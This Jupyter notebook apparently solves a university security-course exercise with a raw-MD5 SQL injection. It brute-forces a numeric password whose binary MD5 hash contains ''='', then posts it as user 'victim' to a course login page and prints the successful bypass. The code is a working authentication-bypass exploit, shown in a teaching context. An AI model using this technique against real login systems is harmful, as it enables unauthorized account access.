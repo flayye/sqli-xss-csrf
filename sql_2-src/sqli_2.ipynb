{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from hashlib import md5\n",
    "from random import sample\n",
    "import random, re\n",
    "import string\n",
    "# ref: https://github.com/seunghunoh57/SQL-Injection/blob/master/sql_1-2.py\n",
    "# ref: https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "input_pass input:\t 15456183418993666691585140766\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "while True:\n",
    "    max_input = (2 ** 32) // 2 - 1\n",
    "    input_pass = \"\"\n",
    "    for i in range(0, 3):\n",
    "        input_pass += str(random.randint(0, max_input))\n",
    "    check = re.search(r\"'='\", str(hashlib.md5(input_pass.encode()).digest()))\n",
    "    if check:\n",
    "        print(\"input_pass input:\\t\", input_pass)\n",
    "        break\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'username': 'victim', 'password': '19285491922097989438764647034'}\n",
      "<h1>Login successful! (victim)</h1><p><b>Submit the following line as your solution:</b><br><tt>username=victim&password=19285491922097989438764647034\n"
     ]
    }
   ],
   "source": [
    "#print(md5(input_pass.encode()).digest())\n",
    "url = 'https://comp427.rice.edu/proj2/sqlinject2/checklogin.php'\n",
    "\n",
    "data = {\n",
    "    'username': \"victim\",\n",
    "    'password': \"19285491922097989438764647034\",\n",
    "}\n",
    "\n",
    "print(data)\n",
    "web_response = requests.post(url, data)\n",
    "print(web_response.text)\n",
    "#print(web_response.text)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Login successful! (victim)\n",
    "\n",
    "Submit the following line as your solution:\n",
    "username=victim&password=15456183418993666691585140766"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
